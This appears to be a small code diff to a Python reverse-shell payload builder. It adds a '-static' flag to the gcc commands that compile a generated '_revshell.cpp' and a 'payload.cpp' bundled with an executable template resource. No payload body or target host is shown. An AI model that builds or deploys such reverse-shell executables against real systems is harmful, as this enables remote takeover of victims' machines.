@@ -118,7 +118,7 @@ def generate_payload(msf_command, output_filename):
     rev_shell.write(reverse_shell)
     rev_shell.close()
     
-    os.system(f"{gcc} -s {os.path.join(dir_path, '_revshell.cpp')} -o {os.path.join(dir_path, output_filename)}")
+    os.system(f"{gcc} -static -s {os.path.join(dir_path, '_revshell.cpp')} -o {os.path.join(dir_path, output_filename)}")
     
     os.remove(os.path.join(dir_path, '_revshell.cpp'))
 
@@ -306,7 +306,7 @@ def main():
         print('[+] Compiling payload...', 'yellow')
         
         os.system(f"{windres} -i {os.path.join(dir_path, 'template.exe.rc')} -o {os.path.join(dir_path, 'rc.o')}")
-        os.system(f"{gcc} -s {os.path.join(dir_path, 'payload.cpp')} {os.path.join(dir_path, 'rc.o')} -o {os.path.join(dir_path, payload_name)}")
+        os.system(f"{gcc} -static -s {os.path.join(dir_path, 'payload.cpp')} {os.path.join(dir_path, 'rc.o')} -o {os.path.join(dir_path, payload_name)}")
         
         print('[*] Removing temp files...', 'yellow')
         
